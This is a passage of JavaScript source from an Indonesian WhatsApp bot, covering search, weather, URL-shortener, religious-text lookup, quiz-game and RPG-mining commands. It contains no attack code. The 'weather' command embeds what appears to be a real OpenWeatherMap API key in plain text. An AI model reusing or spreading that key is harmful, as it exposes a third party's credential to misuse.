await atak.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: ridho})
fs.unlinkSync(ran)
})
.catch((err) => {       
setReply(mess.error.api)
})
})
} else {
setReply(`Kirim/reply gambar atau sticker dengan caption ${command}`)
}
}
break
case 'google':{
if (!isRegist) return onlyRegist()
if (!q) return setReply('masukan teks')
if(q == undefined || q == ' ') return setReply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
let ggs = require('google-it')
 ggs({ 'query': q }).then(results => {
let vars =``
vars += `_*Hasil Pencarian : ${q}*_\n`
for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
var lama = vars.trim()
setReply(lama)
})
}
break
case 'kbbi':{
if (!isRegist) return onlyRegist()
if (args.length < 1) return setReply('Apa yang mau dicari um?')
let asw = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
setReply('Menurut Kbbi:\n\n'+asw.result)
}
break
case 'weather':{
if (!isRegist) return onlyRegist()
if(!args[0]) setReply(" please provide place or location name")
try{
let response = axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${args[0]}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273`)
let res = await response
let name = res.data.name
let Country = res.data.sys.country
let Weather= res.data.weather[0].description
let Temperature = res.data.main.temp + '°C'
let Minimum_Temperature= res.data.main.temp_min + '°C'
let Maximum_Temperature= res.data.main.temp_max + '°C'
let Humidity= res.data.main.humidity + '%'
let Wind= res.data.wind.speed + 'km/h'
setReply(`🌸 Place: ${name}\n💮 Country: ${Country}\n🌈 Weather: ${Weather}\n🎋 Temperature: ${Temperature}\n💠 Minimum Temperature: ${Minimum_Temperature}\n📛 Maximum Temperature: ${Maximum_Temperature}\n💦 Humidity: ${Humidity}\n🎐 Wind: ${Wind}`)
}catch(e){
setReply('Lokasi tidak di temukan, silakan masukan nama negara')
}
}
break
case 'kodepos':
if (!isRegist) return onlyRegist()
try{
let atak = await kodepos(q)
console.log(atak)
let teks =`Berikut Daftar kode pos\nYang telah di temukan\n\n`
for (let i of atak){
 teks +=`Provinsi: ${i.province}\nKota: ${i.city}\nKecamatan: ${i.subdistrict}\nKabupanten: ${i.urban}\nKode Pos: ${i.postalcode}\n\n═════════════════\n\n`
}
setReply(teks)
} catch (err){
setReply("Kodepos tidak di temukan")
console.log(err)
}
break
case 'kodebahasa':{
if (!isRegist) return onlyRegist()
let LANGUAGES = `
*╭─❲ KODE BAHASA ❳*
*│*
*│▸* af: Afrikaans 
*│▸* sq: Albanian
*│▸* ar: Arabic
*│▸* hy: Armenian
*│▸* ca: Catalan 
*│▸* zh: Chinese 
*│▸* zh-cn: Chinese (Mandarin/China)
*│▸* zh-tw: Chinese (Mandarin/Taiwan)
*│▸* zh-yue: Chinese (Cantonese)
*│▸* hr: Croatian
*│▸* cs: Czech
*│▸* da: Danish
*│▸* nl: Dutch
*│▸* en: English    
*│▸* en-au: English (Australia)
*│▸* en-uk: English (United Kingdom)
*│▸* en-us: English (United States) 
*│▸* eo: Esperanto 
*│▸* fi: Finnish 
*│▸* fr: French
*│▸* de: German
*│▸* el: Greek 
*│▸* ht: Haitian Creole 
*│▸* hi: Hindi 
*│▸* hu: Hungarian 
*│▸* is: Icelandic 
*│▸* id: Indonesian 
*│▸* it: Italian
*│▸* ja: Japanese
*│▸* ko: Korean
*│▸* la: Latin
*│▸* lv: Latvian
*│▸* mk: Macedonian
*│▸* no: Norwegian
*│▸* pl: Polish
*│▸* pt: Portuguese
*│▸* pt-br: Portuguese (Brazil)
*│▸* ro: Romanian
*│▸* ru: Russian
*│▸* sr: Serbian
*│▸* sk: Slovak
*│▸* es: Spanish 
*│▸* es-es: Spanish (Spain)
*│▸* es-us: Spanish (United States)
*│▸* sw: Swahili
*│▸* sv: Swedish
*│▸* ta: Tamil
*│▸* th: Thai
*│▸* tr: Turkish
*│▸* vi: Vietnamese 
*│▸* cy: Welsh
*│*
*╰────────────⦁*`
setReply(LANGUAGES)
}
break
case 'brainly':{
if (!isRegist) return onlyRegist()
const { Brainly } = require("brainly-scraper-v2");
const brainly = new Brainly("id"); 
if (!q) setReply( 'Soalnya?')
let atak =`https://www.logosvgpng.com/wp-content/uploads/2018/04/brainly-logo-vector.png`
let foto = await getBuffer(atak)   
let res = await brainly.searchWithMT(`${q}`, `id`)
console.log(res)
let teks =`_*BRAINLY*_\n\n`


   teks += res.map(({ question, answers }, i) => `
_*PERTANYAAN KE ${i + 1}*_
${question.content}${answers.map((v, i) => `

*JAWABAN KE ${i + 1}*${v.verification ? ' (Verified)' : ''}${v.isBest ? ' (Terpilih)' : ''}
${v.content}`).join``}`).join(`
═════════════════
`)
teks +=`\n\n_Thanks for choosing Brainly_`
let mok = [
{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
{"buttonId": `${prefix}donasi`,"buttonText": {"displayText": `ᴅᴏɴᴀsɪ`},"type": "RESPONSE"}]
atak.sendButImage(from, teks, fake, foto, mok, {contextInfo: forward})             
}
break
case 'wallpaper': {
if (!isRegist) return onlyRegist()
if (!q) return setReply( 'Masukkan Query Title')
let anu = await wallpaper(q)
if(anu.length == "0") return setReply("Image tidak di temukan")
let result = anu[Math.floor(Math.random() * anu.length)]
let buttons = [
{buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
]
let buttonMessage = {
image: { url: result.image[0] },
caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
footer: fake,
buttons: buttons,
headerType: 4
}
atak.sendMessage(from, buttonMessage, { quoted: ridho })
}
break
case 'quotes':
if (!isRegist) return onlyRegist()
var data = await fetchJson(`https://megayaa.herokuapp.com/api/randomquote`)
setReply(data.result.quotes+'\n\n-- '+data.result.author)
break
//================================================================================\\
case 'tinyurl':{
if (!isRegist) return onlyRegist()
if (args.length < 1) return setReply(`Masukkan link`)
if (!isUrl) return setReply(`Masukkan link`)
const fetchText = (url, optiono) => {
return new Promise((resolve, reject) => {
return fetch(url, optiono)
.then(response => response.text())
.then(text => resolve(text))
.catch(err => {
console.log(color(err,'red'))
reject(err)
})
})
}
let okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
let shorti = `*Result : ${okok}*`
setReply(shorti)
}
break  
case 'bitly':{
if (!isRegist) return onlyRegist()
if(!q) return setReply("Masukan link")
if(!isUrl) return setReply("Masukan link dengan benar")
try {
let result = await bitly.shorten(q);
setReply(`Link: ${result.link}\nCreated at: ${result.created_at}`)
} catch(e) {
setReply(`Url invalid`)
}
}
break;
case 'cutly':{
if (!isRegist) return onlyRegist()
if (!q) setReply('url/link nya mana?')
let res = await fetch(`http://hadi-api.herokuapp.com/api/cuttly?url=${text}`)
let json = await res.json()
if (json.status) setReply(json.result)
else return setReply('Link Invalid!\nPeriksa url anda')
}
break
case 'tourl': {
if (!isRegist) return onlyRegist()
onlyWait()
let { UploadFileUgu} = require('../lib/uploader')
let media = await atak.downloadAndSaveMediaMessage(quoted)
if (isQuotedImage) {
let anu = await TelegraPh(media)
setReply(util.format(anu))
} else if (isQuotedVideo || isQuotedAudio || isQuotedSticker) {
let anu = await UploadFileUgu(media)
setReply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
//================================================================================\\
case 'adderror':
{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`Yang error apa bro ?\nContoh: ${prefix}adderror nosinya|menu`)
let oke = q.split("|")[0]
let oka = q.split("|")[1]
addError(oke, oka, listerror)
await setReply(`Sukses Menambahkan ${q} ke daftar error`)
}
break
case 'addstik':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!isQuotedSticker) return setReply('Reply stiker nya')
if (!q) return setReply('Nama sticker nya apa?')
for(let i of setiker){
if(i == q) return setReply("Nama tersebut sudah di gunakan")
}
let delb = await atak.downloadAndSaveMediaMessage(quoted)
setiker.push(q) 
await fse.copy(delb, `./media/sticker/stick/${q}.webp`)
fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
}
break
case 'addvn':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!isQuotedAudio) return setReply('Reply vnnya')
if (!q) return setReply('Nama audionya apa')
let delb = await atak.downloadAndSaveMediaMessage(quoted)
audionye.push(q)
await fse.copy(delb,`./media/audio/${q}.mp3`)
fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
fs.unlinkSync(delb)
setReply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
}
break
case 'delerror':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
listerror.splice(q, 1)
fs.writeFileSync('./database/listerror.json', JSON.stringify(listerror))
setReply( `Sukses menghapus ${q} di daftar error`)
}
break
case 'delstik':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply("Masukan query")
try {
for(let i of setiker){
if(i !== q) return setReply("Nama tersebut tidak ada di dalam data base")
}
let wanu = setiker.indexOf(q)
setiker.splice(wanu,1)
fs.unlinkSync(`./media/sticker/stick/${q}.webp`)
fs.writeFileSync('./database/stick.json', JSON.stringify(setiker))
setReply(`Succes delete sticker ${q}!`)
} catch (err) {
console.log(err)
setReply(`Gagal delete sticker ${q}!`)
}
}
break
case 'delvn':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
try {
let wanu = audionye.indexOf(q)
audionye.splice(wanu, 1)
fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
fs.unlinkSync(`./media/audio/${q}.mp3`)
setReply(`Sukses delete vn ${q}`)
} catch (err){
console.log(err)
setReply('eror kak')
}
}
break
case 'listerror': {
if (!isRegist) return onlyRegist()
let errornye = `*List Error*\nJumlah : ${JSON.parse(fs.readFileSync('./database/listerror.json')).length}\n\n`
for (let i of JSON.parse(fs.readFileSync('./database/listerror.json'))){          
errornye += `_*Command*_ : ${i.cmd}\n_*System Error*_ : ${i.error}\n\n*]─────────────────[*\n\n`             
} 
errornye += `${fake}`
setReply(errornye)
}
break
case 'liststik':{
if (!isRegist) return onlyRegist()
let teks = '*Sticker list :*\n\n'
for (let awokwkwk of setiker) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setiker.length}*`
setReply(teks)
}
break
case 'listvn':
{
if (!isRegist) return onlyRegist()
let teks = '*List Vn:*\n\n'
for (let awokwkwk of audionye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total ada : ${audionye.length}*`
teks += `\n\n*Untuk mengambil vn silakan ketik nama vn*`
setReply(teks)
}
break
case 'listban':
if (!isRegist) return onlyRegist()
let banya = `*List Banned*\nJumlah : ${JSON.parse(fs.readFileSync('./database/banned.json')).length}\n\n`
JSON.parse(fs.readFileSync('./database/banned.json')).map(function(e, i){
banya += (i+1)+`📲 Nomer : wa.me/${e.id}\n    📅 Tanggal : ${e.date}\n\n`            
});
setReply(banya)
break
case 'listblockcmd':{
if (!isRegist) return onlyRegist()
let wo = `*「 LIST BLOCK CMD 」*`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
setReply(wo)
}
break
case 'clearallerror':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
setReply("SukseS clear all error")
clearAllError(listerror)
break
case 'clearallban':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
setReply("Sukses clear all ban")
clearAllBan(ban)
break
case 'clearallblock':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
let obj = [] 
fs.writeFileSync('./database/userblocked.json', JSON.stringify(obj))         
await setReply(`ALL USER BLOCKED BERHASIL DI HAPUS`)
}
break
case 'clearallUser':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
setReply("Suksek clear all User")
clearAllUser(user)
break 
//================================================================================\\
case 'hadis': {
if (!isRegist) return onlyRegist()
if (!args[0]) return setReply( `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`)
if (!args[1]) return setReply( `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`)
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
setReply(`No. ${number}
${arab}
${id}`)
} catch (e) {
setReply(`Hadis tidak ditemukan !`)
}
}
break
case 'alquran': {
if (!isRegist) return onlyRegist()
if (!args[0]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
if (!args[1]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
atak.sendMessage(from, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : ridho })
}
break
case 'tafsirsurah': {
if (!isRegist) return onlyRegist()
if (!args[0]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
if (!args[1]) return setReply( `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`)
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
}
break
//================================================================================\\
case 'math': {
if (!isRegist) return onlyRegist()
let modes = {
noob: [-3, 3, -3, 3, '+-', 15000, 10],
easy: [-10, 10, -10, 10, '*/+-', 20000, 40],
medium: [-40, 40, -20, 20, '*/+-', 40000, 150],
hard: [-100, 100, -70, 70, '*/+-', 60000, 350],
extreme: [-999999, 999999, -999999, 999999, '*/', 99999, 9999],
impossible: [-99999999999, 99999999999, -99999999999, 999999999999, '*/', 30000, 35000],
impossible2: [-999999999999999, 999999999999999, -999, 999, '/', 30000, 50000]
}
let operators = {
  '+': '+',
  '-': '-',
  '*': '×',
  '/': '÷'
}
function genMath(mode) {
let [a1, a2, b1, b2, ops, time, bonus] = modes[mode]
let a = randomInt(a1, a2)
let b = randomInt(b1, b2)
let op = pickRandom([...ops])
let result = (new Function(`return ${a} ${op.replace('/', '*')} ${b < 0 ? `(${b})` : b}`))()
if (op == '/') [a, result] = [result, a]
return {
str: `${a} ${operators[op]} ${b}`,
mode,
time,
bonus,
result
}
}
function randomInt(from, to) {
if (from > to) [from, to] = [to, from]
from = Math.floor(from)
to = Math.floor(to)
return Math.floor((to - from) * Math.random() + from)
}
if (!q) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
contoh:
${prefix}math hard
`)
let mode = args[0].toLowerCase()
if (!(mode in modes)) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────    
contoh:
${prefix}math hard
`)
let id = from
if (id in atak.math) return setReply('Masih ada soal belum terjawab di chat ini')
let math2 = genMath(mode)
atak.math[id] = [
await setReply(`Berapa hasil dari *${math2.str}*?\n\nTimeout: ${(math2.time / 1000).toFixed(2)} detik\nBonus Jawaban Benar: Rp${math2.bonus} `),
math2, 4,
setTimeout(async () => {
if (atak.math[id]) await setReply(`Waktu habis!\nJawabannya adalah ${math2.result}\n\n${math2.mode.toUpperCase()}\n\nmath ${math2.mode}`)
delete atak.math[id]
}, math2.time)
]
}
break
case 'caklontong': case 'ckl':{
if (!isGroup) return onlyGroup() 
if (game.isCkl(from, caklontong)) return reply(`Masih ada soal yang belum di selesaikan`)
if (isGame(senderNumber, isOwner, gcount)) return setReply(`Limit game kamu sudah habis`)
if (!isOwner && !kurangGLimit(senderNumber, 1))
{let ko = await atak.sendMessage(from, { text: mess.limitGame }, {quoted: ridho})
setTimeout(() => deleteMessage(ko), 2500)
let kon = await atak.sendMessage(from, { text: mess.wait }, {quoted: ridho})
setTimeout(() => deleteMessage(kon), 3000)}
var data = fs.readFileSync('./lib/game/caklontong.js');
var jsonData = JSON.parse(data);
var randIndex = Math.floor(Math.random() * jsonData.length);
var randKey = jsonData[randIndex];
const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
reply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : ${randKey.result.soal}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
let ikasayank = randKey.result.jawaban.toLowerCase()
let deskripsi = randKey.result.desc
caklontong1.push(deskripsi)
game.addckl(from, ikasayank, gamewaktu, caklontong)
}
break
case 'family100':{
if (!isGroup) return onlyGroup() 
if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)
if (isGame(senderNumber, isOwner, gcount)) return setReply(`Limit game kamu sudah habis`)
if (!isOwner && !kurangGLimit(senderNumber, 1))
{let ko = await atak.sendMessage(from, { text: mess.limitGame }, {quoted: ridho})
setTimeout(() => deleteMessage(ko), 2500)
let kon = await atak.sendMessage(from, { text: mess.wait }, {quoted: ridho})
setTimeout(() => deleteMessage(kon), 3000)}
var data = fs.readFileSync('./lib/game/family100.js');
var fami = JSON.parse(data);
var ly100 = Math.floor(Math.random() * fami.length);
var randKey = fami[ly100];
var Pertanyaan = randKey.result.soal
reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${Pertanyaan}\n*Total Jawaban :* ${randKey.result.jawaban.length }\n\nWaktu : ${gamewaktu} detik`)
let anoh = randKey.result.jawaban
let rgfds = []
for (let i of anoh){
let fefs = i.split('/') ? i.split('/')[0] : i
let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
rgfds.push(axsf.toLowerCase())
}
game.addfam(from, rgfds, gamewaktu, family100)
}
break
case 'tebakbendera': case 'tb':{
if (!isGroup) return onlyGroup() 
if (game.isTebakBendera(from, tebakbendera)) return reply(`Masih ada soal yang belum di selesaikan`)
if (isGame(senderNumber, isOwner, gcount)) return setReply(`Limit game kamu sudah habis`)
if (!isOwner && !kurangGLimit(senderNumber, 1))
{let ko = await atak.sendMessage(from, { text: mess.limitGame }, {quoted: ridho})
setTimeout(() => deleteMessage(ko), 2500)
let kon = await atak.sendMessage(from, { text: mess.wait }, {quoted: ridho})
setTimeout(() => deleteMessage(kon), 3000)}
var data = fs.readFileSync('./lib/game/tebakbendera.js');
var jsonData = JSON.parse(data);
var randIndex = Math.floor(Math.random() * jsonData.length);
var randKey = jsonData[randIndex];
const petunjuk = randKey.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
reply(`*JAWABLAH SOAL BERIKUT*\n\nSoal : Bendera negara manakah itu ${randKey.bendera}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
let ikasayank = randKey.jawaban.toLowerCase()
game.addbendera(from, ikasayank, gamewaktu, tebakbendera)
}
break
case 'tebakgambar':{
if (!isGroup) return reply(mess.only.group)
if (game.isTebakGambar(from, tebakgambar)) return reply(`Masih ada soal yang belum di selesaikan`)
if (isGame(senderNumber, isOwner, gcount)) return setReply(`Limit game kamu sudah habis`)
if (!isOwner && !kurangGLimit(senderNumber, 1))
{let ko = await atak.sendMessage(from, { text: mess.limitGame }, {quoted: ridho})
setTimeout(() => deleteMessage(ko), 2500)
let kon = await atak.sendMessage(from, { text: mess.wait }, {quoted: ridho})
setTimeout(() => deleteMessage(kon), 3000)}
var data = fs.readFileSync('./lib/game/tebakgambar.js');
var jsonData = JSON.parse(data);
var randIndex = Math.floor(Math.random() * jsonData.length);
var randKey = jsonData[randIndex];
const petunjuk = randKey.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
atak.sendMessage(from, { image: { url: randKey.result.soalImg }, caption: `Silahkan jawab soal berikut ini\n\nPetunjuk : ${petunjuk}\nWaktu : ${gamewaktu} detik`, fake }, { quoted: ridho })
let anih = randKey.result.jawaban.toLowerCase()
game.addgambar(from, anih, gamewaktu, tebakgambar)
}
break  	 
case 'tebaklirik': case 'tl':{
if (!isGroup) return onlyGroup() 
if (game.isTebakLirik(from, tebaklirik)) return reply(`Masih ada soal yang belum di selesaikan`)
if (isGame(senderNumber, isOwner, gcount)) return setReply(`Limit game kamu sudah habis`)
if (!isOwner && !kurangGLimit(senderNumber, 1))
{let ko = await atak.sendMessage(from, { text: mess.limitGame }, {quoted: ridho})
setTimeout(() => deleteMessage(ko), 2500)
let kon = await atak.sendMessage(from, { text: mess.wait }, {quoted: ridho})
setTimeout(() => deleteMessage(kon), 3000)}
var data = fs.readFileSync('./lib/game/tebaklirik.js');
var jsonData = JSON.parse(data);
var randIndex = Math.floor(Math.random() * jsonData.length);
var randKey = jsonData[randIndex];      
const petunjuk = randKey.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.result.question}\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`)
let anal = randKey.result.answer.toLowerCase()
game.addtebaklirik(from, anal, gamewaktu, tebaklirik)
}
break            
case 'siapaaku': case 'siapakahaku': case 'sa':{
if (!isGroup) return onlyGroup() 
if (game.isTebakGambar(from, tebakgambar)) return reply(`Masih ada soal yang belum di selesaikan`)
if (isGame(senderNumber, isOwner, gcount)) return setReply(`Limit game kamu sudah habis`)
if (!isOwner && !kurangGLimit(senderNumber, 1))
{let ko = await atak.sendMessage(from, { text: mess.limitGame }, {quoted: ridho})
setTimeout(() => deleteMessage(ko), 2500)
let kon = await atak.sendMessage(from, { text: mess.wait }, {quoted: ridho})
setTimeout(() => deleteMessage(kon), 3000)}
var data = fs.readFileSync('./lib/game/siapaaku.js');
var jsonData = JSON.parse(data);
var randIndex = Math.floor(Math.random() * jsonData.length);
var randKey = jsonData[randIndex];
reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.data.soal}\n\nWaktu : ${gamewaktu}s`)
let anau = randKey.data.jawaban.toLowerCase()
game.addsyiko(from, anau, gamewaktu, siapaaku)
}
break
case 'tebakanime2':
try{
if (!isGroup) return onlyGroup() 
if (game.isTebakAnime(from, tebakanime)) return reply(`Masih ada soal yang belum di selesaikan`)
if (isGame(senderNumber, isOwner, gcount)) return setReply(`Limit game kamu sudah habis`)
if (!isOwner && !kurangGLimit(senderNumber, 1))
{let ko = await atak.sendMessage(from, { text: mess.limitGame }, {quoted: ridho})
setTimeout(() => deleteMessage(ko), 2500)
let kon = await atak.sendMessage(from, { text: mess.wait }, {quoted: ridho})
setTimeout(() => deleteMessage(kon), 3000)}
var pin = await hx.pinterest(karakter)
var ac = pin[Math.floor(Math.random() * pin.length)]                        
var penunjuk = karakter.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
atak.sendMessage(from, { image: { url: ac }, caption: `Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`, fake }, { quoted: ridho })
asi = karakter.toLowerCase()
game.addanime(from, asi, gamewaktu, tebakanime)
} catch (err){					
var data = fs.readFileSync('./lib/game/tebakanime.js');
var jsonData = JSON.parse(data);
var randIndex = Math.floor(Math.random() * jsonData.length);
var randKey = jsonData[randIndex];                                        
var petunjuk = randKey.hasil.nama.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
atak.sendMessage(from, { image: { url: randKey.hasil.image }, caption: `Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`, fake }, { quoted: ridho })
var nurulsayank = randKey.hasil.nama.toLowerCase()
game.addanime(from, nurulsayank, gamewaktu, tebakanime)              
}
break
case 'tebakanime': case 'ta':{
if (!isGroup) return onlyGroup() 
if (game.isTebakAnime(from, tebakanime)) return reply(`Masih ada soal yang belum di selesaikan`)
if (isGame(senderNumber, isOwner, gcount)) return setReply(`Limit game kamu sudah habis`)
if (!isOwner && !kurangGLimit(senderNumber, 1))
{let ko = await atak.sendMessage(from, { text: mess.limitGame }, {quoted: ridho})
setTimeout(() => deleteMessage(ko), 2500)
let kon = await atak.sendMessage(from, { text: mess.wait }, {quoted: ridho})
setTimeout(() => deleteMessage(kon), 3000)}
var data = fs.readFileSync('./lib/game/tebakanime.js');
var jsonData = JSON.parse(data);
var randIndex = Math.floor(Math.random() * jsonData.length);
var randKey = jsonData[randIndex];                                        
const petunjuk = randKey.hasil.nama.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-')
atak.sendMessage(from, { image: { url: randKey.hasil.image }, caption: `Silahkan tebak nama karakter anime berikut ini\n\nPetunjuk : ${petunjuk}\n\nWaktu : ${gamewaktu} detik`, fake }, { quoted: ridho })
let nurulsayank = randKey.hasil.nama.toLowerCase()
game.addanime(from, nurulsayank, gamewaktu, tebakanime)
}
break
case 'tebakkata': case 'tk':{
if (!isGroup) return onlyGroup() 
if (game.isTebakKata(from, tebakkata)) return reply(`Masih ada soal yang belum di selesaikan`)          
if (isGame(senderNumber, isOwner, gcount)) return setReply(`Limit game kamu sudah habis`)
if (!isOwner && !kurangGLimit(senderNumber, 1))
{let ko = await atak.sendMessage(from, { text: mess.limitGame }, {quoted: ridho})
setTimeout(() => deleteMessage(ko), 2500)
let kon = await atak.sendMessage(from, { text: mess.wait }, {quoted: ridho})
setTimeout(() => deleteMessage(kon), 3000)}
var data = fs.readFileSync('./lib/game/tebakkata.js');
var jsonData = JSON.parse(data);
var randIndex = Math.floor(Math.random() * jsonData.length);
var randKey = jsonData[randIndex];
reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${randKey.result.acak}\n\nTipe: ${randKey.result.tipe}\n\nWaktu : ${gamewaktu} detik`)
let ahhh = randKey.result.jawaban.toLowerCase()
game.addkata(from, ahhh, gamewaktu, tebakkata)
}
break
//================================================================================\\
case 'leaderboard':
{      
if (!isRegist) return onlyRegist() 
let txt = `「 *LEADERBOARD* 」\n\n`
for (let i of _inventory){
txt += `➸ *ID :* ${i.id}\n`
txt += `*🐟Ikan* : ${i.ikan}\n`
txt += `*🐔Ayam* : ${i.ayam}\n`
txt += `*🐇Kelinci* : ${i.kelinci}\n`
txt += `*🐑Domba* : ${i.domba}\n`
txt += `*🐄Sapi* : ${i.sapi}\n`
txt += `*🐘Gajah* : ${i.gajah}\n\n`
}
setReply(txt)       
}
break
case 'mining': case 'menambang':{
if (!isRegist) return onlyRegist() 
if (!isInventory){ addInventori(senderNumber) }
if (isCekDarah < 1) return setReply('Kamu kelelahan!, cobalah heal menggunakan potion') 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]  
var emasnya = emas[Math.floor(Math.random() * emas.length)]  
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]  
setTimeout( () => {
let caption = `[ HASIL MENAMBANG ]\n*Besi* : ${besinya}\n*Emas* : ${emasnya}\n*Emerald* : ${emeraldnya}`
let buttons = [
{buttonId: `${prefix + command}`, buttonText: {displayText: 'Menambang lagi⛏️'}, type: 1},
{buttonId: `${prefix}inventori`,buttonText: {displayText: 'inventori📦'}, type: 1}]
let buttonMessage = {
image: { url: 'https://b.top4top.io/p_2421jbvqb1.jpg' },
caption: caption,
footer: fake,
buttons: buttons,
headerType: 4
}
atak.sendMessage(from, buttonMessage, { quoted: setQuoted }) 
}, 7000)  
setTimeout( () => {
setReply(`${senderNumber} Mulai menambang🎣`)     
}, 1500)
kurangDarah(senderNumber, 10)
addBesi(senderNumber, besinya)
addEmas(senderNumber, emasnya)
addEmerald(senderNumber, emeraldnya)	     
}   
break  
case 'beli': case 'buy':{
if (!isRegist) return onlyRegist() 
if (!isInventoryMonay){ addUserId(gcount, calender, pushname, senderNumber) }
if (!isInventory){ addInventori(senderNumber) }
